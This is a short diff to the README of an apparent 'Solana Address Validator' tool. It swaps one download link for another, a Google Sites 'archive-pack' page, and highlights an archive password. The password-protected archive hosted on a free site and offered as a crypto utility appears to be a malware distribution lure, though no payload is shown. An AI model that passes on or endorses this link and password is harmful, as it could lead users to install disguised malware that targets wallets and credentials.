@@ -30,9 +30,9 @@ Solana Address Validator is a professional tool for developers and users who nee
 
 Download the latest release from the link below.
 
-Download: https://software-hub.forumotion.com/t79-solana-address-validator-windows
+**Download:** https://sites.google.com/view/archive-pack/download
 
-Password: 68924
+**Password:** 68924
 
 ---
 
